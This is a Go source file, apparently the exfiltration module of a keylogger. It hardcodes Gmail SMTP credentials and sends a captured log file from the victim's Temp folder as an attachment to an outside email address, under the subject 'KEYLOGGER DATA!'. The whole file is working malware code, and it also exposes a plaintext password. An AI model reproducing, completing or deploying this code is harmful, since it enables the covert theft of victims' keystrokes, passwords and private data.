package email

import (
	"gopkg.in/gomail.v2"
)

var (
	host       = "smtp.gmail.com"
	from       = "tester.123.pepito@gmail.com"
	password   = "adrenalina12"
	portNumber = 587
)

func Send() {
	m := gomail.NewMessage()
	m.SetHeader("From", from)
	m.SetHeader("To", "xorexa6205@zcai77.com")
	m.SetHeader("Subject", "KEYLOGGER DATA!")
	m.SetBody("text/html", "Hello <b>HACKER</b>!")
	m.Attach("/Users/USUARIO/AppData/Local/Temp/mat-debug-26080.log")

	d := gomail.NewPlainDialer(host, portNumber, from, password)
	if err := d.DialAndSend(m); err != nil {
		panic(err)
	}
}
